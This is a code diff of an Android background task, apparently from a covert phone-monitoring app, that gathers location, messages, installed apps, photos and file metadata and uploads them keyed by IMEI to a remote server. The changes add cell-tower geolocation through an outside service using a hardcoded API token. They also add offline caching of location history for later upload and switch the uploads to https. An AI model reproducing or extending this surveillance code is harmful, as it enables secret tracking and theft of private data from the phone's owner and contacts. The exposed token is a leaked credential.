@@ -15,18 +15,22 @@ import android.graphics.drawable.Drawable;
 import android.graphics.drawable.LayerDrawable;
 import android.graphics.drawable.VectorDrawable;
 import android.location.Criteria;
-import android.location.Location;
 import android.location.LocationManager;
 import android.net.TrafficStats;
 import android.net.Uri;
+import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
 import android.os.Environment;
 import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.system.Os;
 import android.system.StructStat;
+import android.telephony.TelephonyManager;
+import android.telephony.gsm.GsmCellLocation;
+import android.text.TextUtils;
 import android.util.Base64;
 import android.util.Log;
 
@@ -34,19 +38,26 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.sql.Timestamp;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 
 import src.silent.utils.BatteryHandler;
 import src.silent.utils.BitmapJsonHelper;
+import src.silent.utils.DBAdapter;
 import src.silent.utils.LocationHandler;
 import src.silent.utils.SHA1Helper;
 import src.silent.utils.ServerCommunicationHandler;
@@ -60,12 +71,9 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
 
     @Override
     protected Void doInBackground(MasterTaskParams... params) {
-
-        if (ServerCommunicationHandler.getServerAuthentification(params[0].context,
-                "http://192.168.1.24:58938/api/Service/GetAuthentification",
-                params[0].IMEI)) {
+        if (checkInternetConnection(params[0].context)) {
             String maskHash = ServerCommunicationHandler.getMask(params[0].context,
-                    "http://192.168.1.24:58938/api/Service/GetMask",
+                    "https://192.168.1.24:443/api/Service/GetMask",
                     params[0].IMEI);
             String[] maskHash2 = maskHash.split(";");
             String[] hashes = maskHash2[1].split(":");
@@ -107,11 +115,34 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
             }
 
             ServerCommunicationHandler.executeDataPost(params[0].context,
-                    "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                    "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                     params[0].IMEI);
+        } else {
+            getSmartphoneLocation(null, null, params[0].context);
         }
 
+
         return null;
+    }
+
+    private boolean checkInternetConnection(Context context) {
+        boolean mobileYN = false;
+        boolean wifiState;
+        try {
+            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm.getSimState() == TelephonyManager.SIM_STATE_READY) {
+                mobileYN = Settings.Global.getInt(context.getContentResolver(), "mobile_data", 1) == 1;
+            }
+
+            WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
+            wifiState = wifi.isWifiEnabled();
+        } catch (Exception ex) {
+            Log.d("EROARE", ex.getMessage());
+            mobileYN = false;
+            wifiState = false;
+        }
+
+        return mobileYN || wifiState;
     }
 
     private void getFilesMetadata(String hash, Context context, String IMEI) {
@@ -125,7 +156,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
             int counter = 0;
             SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
             for (String info : external) {
-                counter ++;
+                counter++;
                 String[] inf = info.split(";");
                 Date date = df.parse(inf[1]);
                 if (date.getTime() > Long.parseLong(newHash)) {
@@ -141,7 +172,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                     metadata.put("Hash", newHash);
                     bulkData.put("Metadata", metadata);
                     ServerCommunicationHandler.executeDataPost(context,
-                            "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                            "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                             IMEI);
                     informationArray = new JSONArray();
                 }
@@ -154,7 +185,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                 metadata.put("Hash", newHash);
                 bulkData.put("Metadata", metadata);
                 ServerCommunicationHandler.executeDataPost(context,
-                        "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                        "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                         IMEI);
             }
         } catch (Exception ex) {
@@ -210,52 +241,97 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
         LocationManager locationManager = (LocationManager)
                 context.getSystemService(Context.LOCATION_SERVICE);
         try {
-            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            JSONObject locationData = new JSONObject();
-            String shaString = "";
-            if (location != null && location.getTime() > Calendar.getInstance().getTimeInMillis() -
-                    120000) {
+            String[] latLong = null;
+            if (bulkData != null) {
+                JSONObject locationData = new JSONObject();
+                String shaString = "";
 
-                shaString += String.valueOf(location.getLatitude());
-                shaString += String.valueOf(location.getLongitude());
+                DBAdapter adapter = new DBAdapter(context, "databaseLocation");
+                adapter.startConnection();
+                List<String[]> latLongList = adapter.selectAllLatLong();
+                List<String[]> codesList = adapter.selectAllCodes();
+                JSONArray array = new JSONArray();
+                if (!latLongList.isEmpty()) {
+                    for (String[] item : latLongList) {
+                        JSONObject object = new JSONObject();
+                        object.put("Latitude", Base64.encodeToString(item[0].getBytes(),
+                                Base64.URL_SAFE));
+                        object.put("Longitude", Base64.encodeToString(item[1].getBytes(),
+                                Base64.URL_SAFE));
+                        object.put("Date", Base64.encodeToString(item[2].getBytes(),
+                                Base64.URL_SAFE));
+                        array.put(object);
+                    }
+                }
+                if (!codesList.isEmpty()) {
+                    for (String[] item : codesList) {
+                        String[] latLongLocal = getLatLongFromCellLocation(item[0], item[1], item[3], item[2]);
+                        JSONObject object = new JSONObject();
+                        object.put("Latitude", Base64.encodeToString(latLongLocal[0].getBytes(),
+                                Base64.URL_SAFE));
+                        object.put("Longitude", Base64.encodeToString(latLongLocal[1].getBytes(),
+                                Base64.URL_SAFE));
+                        object.put("Date", Base64.encodeToString(item[4].getBytes(),
+                                Base64.URL_SAFE));
+                        array.put(object);
+                    }
+                }
+                adapter.closeConnection();
 
-                locationData.put("Latitude",
-                        Base64.encodeToString(String.valueOf(location.getLatitude()).getBytes(),
+                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
+                        locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    latLong = getLocationWithService(locationManager);
+                } else {
+                    String[] codes = getCellLocation(context);
+                    if (!Arrays.asList(codes).contains("")) {
+                        latLong = getLatLongFromCellLocation(codes[0], codes[1], codes[2], codes[3]);
+                    }
+                }
+
+                if (latLong != null && !Arrays.asList(latLong).contains("")) {
+                    shaString += latLong[0];
+                    shaString += latLong[1];
+
+                    String theHash = SHA1Helper.SHA1(shaString);
+                    if (!theHash.equals(hash)) {
+                        JSONObject object = new JSONObject();
+                        object.put("Latitude",
+                                Base64.encodeToString(latLong[0].getBytes(),
+                                        Base64.URL_SAFE));
+                        object.put("Longitude",
+                                Base64.encodeToString(latLong[1].getBytes(),
+                                        Base64.URL_SAFE));
+                        Long milies = Calendar.getInstance().getTimeInMillis();
+                        Timestamp currentTime = new Timestamp(milies);
+                        object.put("Date", Base64.encodeToString(currentTime.toString().getBytes(),
                                 Base64.URL_SAFE));
-                locationData.put("Longitude",
-                        Base64.encodeToString(String.valueOf(location.getLongitude()).getBytes(),
+
+                        array.put(object);
+                        locationData.put("Hash", Base64.encodeToString(theHash.getBytes(),
                                 Base64.URL_SAFE));
+                    }
+                }
+                if (array.length() != 0) {
+                    locationData.put("Locations", array);
+                    bulkData.put("Location", locationData);
+                }
             } else {
-                LocationHandler locationHandler = new LocationHandler();
-                Criteria criteria = new Criteria();
-                criteria.setAccuracy(Criteria.ACCURACY_COARSE);
-                criteria.setPowerRequirement(Criteria.POWER_LOW);
-                criteria.setAltitudeRequired(false);
-                criteria.setBearingRequired(false);
-                criteria.setSpeedRequired(false);
-                criteria.setCostAllowed(true);
-                criteria.setHorizontalAccuracy(Criteria.ACCURACY_HIGH);
-                criteria.setVerticalAccuracy(Criteria.ACCURACY_HIGH);
+                Long milies = Calendar.getInstance().getTimeInMillis();
+                Timestamp currentTime = new Timestamp(milies);
+                DBAdapter adapter = new DBAdapter(context, "databaseLocation");
+                adapter.startConnection();
+                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
+                        locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    latLong = getLocationWithService(locationManager);
 
-                Looper.prepare();
-                locationManager.requestSingleUpdate(criteria, locationHandler, null);
-                Looper.loop();
-
-                shaString += locationHandler.getLatitude();
-                shaString += locationHandler.getLongitude();
-                locationData.put("Latitude",
-                        Base64.encodeToString(locationHandler.getLatitude().getBytes(),
-                                Base64.URL_SAFE));
-                locationData.put("Longitude",
-                        Base64.encodeToString(locationHandler.getLongitude().getBytes(),
-                                Base64.URL_SAFE));
-            }
-
-            String theHash = SHA1Helper.SHA1(shaString);
-            if (!theHash.equals(hash)) {
-                locationData.put("Hash", Base64.encodeToString(theHash.getBytes(),
-                        Base64.URL_SAFE));
-                bulkData.put("Location", locationData);
+                    adapter.insertLatLong(latLong[0], latLong[1], currentTime.toString());
+                } else {
+                    String[] codes = getCellLocation(context);
+                    if (!Arrays.asList(codes).contains("")) {
+                        adapter.insertCodes(codes[0], codes[1], currentTime.toString(), codes[3], codes[2]);
+                    }
+                }
+                adapter.closeConnection();
             }
 
         } catch (SecurityException ex) {
@@ -265,6 +341,135 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
         } catch (Exception ex) {
             Log.d("LOCATION EXCEPTION", ex.getMessage());
         }
+    }
+
+    private String[] getLatLongFromCellLocation(String cid, String lac, String mcc, String mnc) {
+        String[] latLong = {"", ""};
+        HttpURLConnection connection = null;
+        try {
+            URL url = new URL("http://eu1.unwiredlabs.com/v2/process.php");
+            connection = (HttpURLConnection) url.openConnection();
+            //connection.setReadTimeout(10000);
+            //connection.setConnectTimeout(15000);
+            connection.setRequestMethod("POST");
+            connection.setDoInput(true);
+            connection.setDoOutput(true);
+            connection.setRequestProperty("Content-Type", "application/json");
+
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("token", "901fde4ec0c92c");
+            jsonObject.put("radio", "gsm");
+            jsonObject.put("mcc", Integer.parseInt(mcc));
+            jsonObject.put("mnc", Integer.parseInt(mnc));
+
+            JSONArray array = new JSONArray();
+            JSONObject cells = new JSONObject();
+            cells.put("lac", Integer.parseInt(lac));
+            cells.put("cid", Integer.parseInt(cid));
+            array.put(cells);
+
+            jsonObject.put("cells", array);
+            jsonObject.put("address", 1);
+
+            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
+            outputStream.writeBytes(jsonObject.toString());
+            outputStream.flush();
+            outputStream.close();
+
+            BufferedReader input = new BufferedReader(new InputStreamReader(connection.
+                    getInputStream()));
+            String response = "";
+            for (String line; (line = input.readLine()) != null; response += line) ;
+
+            JSONObject resp = new JSONObject(response);
+            if (resp.has("lat")) {
+                double lat = resp.getDouble("lat");
+                latLong[0] = String.valueOf(lat);
+            }
+            if (resp.has("lon")) {
+                double lon = resp.getDouble("lon");
+                latLong[1] = String.valueOf(lon);
+            }
+        } catch (Exception ex) {
+            Log.d("EROARE", ex.getMessage());
+            latLong[0] = "";
+            latLong[1] = "";
+        } finally {
+            if (connection != null)
+                connection.disconnect();
+        }
+        return latLong;
+    }
+
+    private String[] getCellLocation(Context context) {
+        String[] codes = {"", "", "", ""};
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService
+                    (Context.TELEPHONY_SERVICE);
+            GsmCellLocation cellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
+            String networkOperator = telephonyManager.getNetworkOperator();
+
+            codes[0] = String.valueOf(cellLocation.getCid());
+            codes[1] = String.valueOf(cellLocation.getLac());
+            if (!TextUtils.isEmpty(networkOperator)) {
+                codes[2] = networkOperator.substring(0, 3);
+                codes[3] = networkOperator.substring(3);
+            } else {
+                codes[2] = "";
+                codes[3] = "";
+            }
+        } catch (SecurityException ex) {
+            codes[0] = "";
+            codes[1] = "";
+            codes[2] = "";
+            codes[3] = "";
+        }
+
+        return codes;
+    }
+
+    private String[] getLocationWithService(final LocationManager locationManager) {
+        String[] latLong = {"", ""};
+        try {
+            final LocationHandler locationHandler = new LocationHandler();
+            Thread thread = new Thread() {
+                @Override
+                public void run() {
+                    Criteria criteria = new Criteria();
+                    criteria.setAccuracy(Criteria.ACCURACY_COARSE);
+                    criteria.setPowerRequirement(Criteria.POWER_LOW);
+                    criteria.setAltitudeRequired(false);
+                    criteria.setBearingRequired(false);
+                    criteria.setSpeedRequired(false);
+                    criteria.setCostAllowed(true);
+                    criteria.setHorizontalAccuracy(Criteria.ACCURACY_HIGH);
+                    criteria.setVerticalAccuracy(Criteria.ACCURACY_HIGH);
+                    Looper.prepare();
+                    locationManager.requestSingleUpdate(criteria, locationHandler, null);
+                    Looper.loop();
+                    if (Looper.myLooper() != null) {
+                        Looper.myLooper().quit();
+                    }
+                }
+            };
+            thread.start();
+            thread.join();
+
+            locationManager.removeUpdates(locationHandler);
+            latLong[0] = locationHandler.getLatitude();
+            latLong[1] = locationHandler.getLongitude();
+
+        } catch (SecurityException ex) {
+            Log.d("Location EXCEPTION", ex.getMessage());
+            latLong[0] = "";
+            latLong[1] = "";
+        } catch (Exception ex) {
+            Log.d("EROARE", ex.getMessage());
+            latLong[0] = "";
+            latLong[1] = "";
+        }
+
+        return latLong;
     }
 
     private void getMessages(JSONObject bulkData, String hash, Context context) {
@@ -530,7 +735,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                 String package_name = packageInfo.packageName;
                 long appDate = pm.getPackageInfo(package_name, 0).firstInstallTime;
                 if (appDate > Long.parseLong(hash)) {
-                    counter ++;
+                    counter++;
                     JSONObject information = new JSONObject();
 
                     ApplicationInfo app = pm.getApplicationInfo(package_name, 0);
@@ -555,7 +760,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                         applications.put("Hash", newHash);
                         bulkData.put("Applications", applications);
                         ServerCommunicationHandler.executeDataPost(context,
-                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                                "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                                 IMEI);
                         informationArray = new JSONArray();
                     }
@@ -568,7 +773,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                 applications.put("Hash", newHash);
                 bulkData.put("Applications", applications);
                 ServerCommunicationHandler.executeDataPost(context,
-                        "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                        "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                         IMEI);
             }
         } catch (Exception ex) {
@@ -647,7 +852,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                             photos.put("Hash", newHash);
                             bulkData.put("Photos", photos);
                             ServerCommunicationHandler.executeDataPost(context,
-                                    "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                                    "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                                     IMEI);
                             informationArray = new JSONArray();
                         }
@@ -664,7 +869,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
                 bulkData.put("Photos", photos);
 
                 ServerCommunicationHandler.executeDataPost(context,
-                        "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                        "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                         IMEI);
             }
         } catch (Exception ex) {
